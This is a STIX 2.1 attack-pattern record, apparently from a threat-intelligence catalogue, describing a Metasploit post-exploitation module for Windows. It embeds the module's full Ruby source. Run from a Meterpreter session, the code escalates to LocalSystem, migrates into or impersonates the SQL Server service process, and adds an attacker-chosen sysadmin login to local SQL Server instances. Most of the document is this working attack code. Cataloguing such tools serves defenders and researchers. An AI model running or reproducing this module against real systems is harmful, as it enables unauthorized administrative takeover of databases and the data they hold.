{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--36f798d5-921b-492e-96a8-f4ccc8ca2a21",
    "created": "2024-08-14T16:33:04.990427Z",
    "modified": "2024-08-14T16:33:04.990431Z",
    "name": "Windows Manage Local Microsoft SQL Server Authorization Bypass",
    "description": " When this module is executed, it can be used to add a sysadmin to local SQL Server instances.  It first attempts to gain LocalSystem privileges using the \"getsystem\" escalation methods. If those privileges are not sufficient to add a sysadmin, then it will migrate to the SQL Server service process associated with the target instance.  The sysadmin login is added to the local SQL Server using native SQL clients and stored procedures.  If no instance is specified then the first identified instance will be used.  Why is this possible? By default in SQL Server 2k-2k8, LocalSystem is assigned syadmin privileges.  Microsoft changed the default in SQL Server 2012 so that LocalSystem no longer has sysadmin privileges. However, this can be overcome by migrating to the SQL Server process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/mssql_local_auth_bypass.rb",
            "external_id": "mssql_local_auth_bypass.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'English'\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::MSSQL\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Local Microsoft SQL Server Authorization Bypass',\n        'Description' => %q{\n          When this module is executed, it can be used to add a sysadmin to local\n          SQL Server instances.  It first attempts to gain LocalSystem privileges\n          using the \"getsystem\" escalation methods. If those privileges are not\n          sufficient to add a sysadmin, then it will migrate to the SQL Server\n          service process associated with the target instance.  The sysadmin\n          login is added to the local SQL Server using native SQL clients and\n          stored procedures.  If no instance is specified then the first identified\n          instance will be used.\n\n          Why is this possible? By default in SQL Server 2k-2k8, LocalSystem\n          is assigned syadmin privileges.  Microsoft changed the default in\n          SQL Server 2012 so that LocalSystem no longer has sysadmin privileges.\n          However, this can be overcome by migrating to the SQL Server process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Scott Sutherland <scott.sutherland[at]netspi.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_rev2self\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DB_USERNAME', [true, 'New sysadmin login', '']),\n        OptString.new('DB_PASSWORD', [true, 'Password for new sysadmin login', '']),\n        OptString.new('INSTANCE', [false, 'Name of target SQL Server instance', nil]),\n        OptBool.new('REMOVE_LOGIN', [true, 'Remove DB_USERNAME login from database', false])\n      ]\n    )\n  end\n\n  def run\n    # Set instance name (if specified)\n    instance = datastore['INSTANCE'].to_s\n\n    # Display target\n    print_status(\"#{session_display_info}: Running module against #{sysinfo['Computer']}\")\n\n    # Identify available native SQL client\n    get_sql_client\n    fail_with(Failure::Unknown, 'Unable to identify a SQL client') unless @sql_client\n\n    # Get LocalSystem privileges\n    system_status = get_system\n    fail_with(Failure::Unknown, 'Unable to get SYSTEM') unless system_status\n    begin\n      service = check_for_sqlserver(instance)\n      fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service\n\n      print_status(\"#{session_display_info}: Identified service '#{service[:display]}', PID: #{service[:pid]}\")\n      instance_name = service[:display].gsub('SQL Server (', '').gsub(')', '').strip\n\n      if datastore['REMOVE_LOGIN']\n        remove_login(service, instance_name)\n      else\n        add_login(service, instance_name)\n      end\n    ensure\n      # attempt to return to original priv context\n      session.sys.config.revert_to_self\n    end\n  end\n\n  def add_login(service, instance_name)\n    add_login_status = add_sql_login(datastore['DB_USERNAME'],\n                                     datastore['DB_PASSWORD'],\n                                     instance_name)\n\n    unless add_login_status\n      raise 'Retry'\n    end\n  rescue RuntimeError => e\n    if e.message == 'Retry'\n      retry if impersonate_sql_user(service)\n    else\n      raise $ERROR_INFO\n    end\n  end\n\n  def remove_login(service, instance_name)\n    remove_status = remove_sql_login(datastore['DB_USERNAME'], instance_name)\n\n    unless remove_status\n      raise 'Retry'\n    end\n  rescue RuntimeError => e\n    if e.message == 'Retry'\n      retry if impersonate_sql_user(service)\n    else\n      raise $ERROR_INFO\n    end\n  end\n\n  def add_sql_login(dbuser, dbpass, instance)\n    print_status(\"#{session_display_info}: Attempting to add new login \\\"#{dbuser}\\\"...\")\n    query = mssql_sa_escalation(username: dbuser, password: dbpass)\n\n    # Get Data\n    add_login_result = run_sql(query, instance)\n\n    case add_login_result\n    when '', /new login created/i\n      print_good(\"#{session_display_info}: Successfully added login \\\"#{dbuser}\\\" with password \\\"#{dbpass}\\\"\")\n      return true\n    when /already exists/i\n      fail_with(Failure::BadConfig, \"Unable to add login #{dbuser}, user already exists\")\n    when /password validation failed/i\n      fail_with(Failure::BadConfig, \"Unable to add login #{dbuser}, password does not meet complexity requirements\")\n    else\n      print_error(\"#{session_display_info}: Unable to add login #{dbuser}\")\n      print_error(\"#{session_display_info}: Database Error:\\n #{add_login_result}\")\n      return false\n    end\n  end\n\n  def remove_sql_login(dbuser, instance_name)\n    print_status(\"#{session_display_info}: Attempting to remove login \\\"#{dbuser}\\\"\")\n    query = \"sp_droplogin '#{dbuser}'\"\n\n    remove_login_result = run_sql(query, instance_name)\n\n    # Display result\n    if remove_login_result.empty?\n      print_good(\"#{session_display_info}: Successfully removed login \\\"#{dbuser}\\\"\")\n      return true\n    else\n      # Fail\n      print_error(\"#{session_display_info}: Unabled to remove login #{dbuser}\")\n      print_error(\"#{session_display_info}: Database Error:\\n\\n #{remove_login_result}\")\n      return false\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}